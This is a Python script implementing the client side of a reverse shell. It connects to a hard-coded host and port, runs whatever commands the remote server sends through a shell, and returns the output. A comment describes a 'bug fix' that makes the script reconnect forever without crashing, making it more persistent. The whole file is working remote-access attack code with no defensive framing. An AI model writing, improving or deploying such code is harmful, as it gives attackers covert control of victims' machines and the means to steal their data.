import os
import socket
import subprocess
import time

# create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = "192.168.162.200"
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error:  " + str(msg))

def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error:  " + str(msg))
        time.sleep(5)
        socket_connect()

# receive commands from remote server and run on local machine
def receive_commands():
    while True:
        data = s.recv(20480)
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except Exception:
                pass
        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '>'))
                print(output_str)
            except Exception:
                output_str = "Command not recognized" + '\n'
                s.send(str.encode(output_str + str(os.getcwd()) + '>'))
                print(output_str)
    s.close()

def main():
    # BUG FIX: the original version called main() again at the end of every
    # run -- not just after an error, but every single time, including the
    # normal 'quit' path. Since each call is a new stack frame (not a loop
    # iteration), this eventually hit Python's recursion limit and crashed
    # with a RecursionError after enough reconnect attempts, instead of
    # running indefinitely the way the code seemed to intend. A while loop
    # gets the same "keep trying to reconnect" behavior without growing the
    # call stack.
    global s
    while True:
        try:
            socket_create()
            socket_connect()
            receive_commands()
        except Exception:
            print("Error in main")
            time.sleep(5)
        finally:
            s.close()

main()
